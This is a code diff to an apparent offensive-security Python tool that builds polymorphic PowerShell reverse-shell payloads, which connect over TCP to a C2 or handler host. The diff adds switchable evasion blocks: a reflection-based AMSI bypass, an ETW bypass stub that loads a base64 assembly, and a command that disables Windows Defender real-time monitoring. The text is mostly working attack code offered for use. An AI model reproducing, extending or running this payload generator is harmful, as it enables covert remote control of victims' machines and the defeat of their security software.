@@ -10,7 +10,7 @@ def rand_name(length=8):
     return ''.join(random.choices(string.ascii_letters, k=length))
 # make sure to change the ip to your c2 or handler ip.
 
-def generate_polymorphic_ps(host="localhost", port=1443):
+def generate_polymorphic_ps(host="localhost", port=1443, evasion_enabled=False):
     folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
     os.makedirs(folder, exist_ok=True)
 
@@ -21,10 +21,33 @@ def generate_polymorphic_ps(host="localhost", port=1443):
         "main", "client", "stream", "reader", "writer", "cmd", "resp", "iex"
     ]}
 
-    ps = f'''
+    # --- Evasion Blocks ---
+    amsi_bypass = """
 $A='System.Management.Automation.AmsiUtils';
 $B=[Ref].Assembly.GetType($A);
 $B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    """.strip()
+
+    # ETW bypass example (can be replaced with better/obfuscated variant)
+    etw_bypass = """
+try {
+    [System.Reflection.Assembly]::Load([Convert]::FromBase64String(
+    '...')) | Out-Null
+} catch {}
+    """.strip()
+
+    defender_disable = """
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+} catch {}
+    """.strip()
+
+    evasion_code = ""
+    if evasion_enabled:
+        evasion_code = "\n".join([amsi_bypass, etw_bypass, defender_disable])
+
+    ps = f'''
+{evasion_code}
 
 Function {v["main"]} {{
     ${v["client"]} = New-Object System.Net.Sockets.TcpClient
@@ -59,4 +82,3 @@ Function {v["main"]} {{
         f.write(ps)
 
     return filename
-
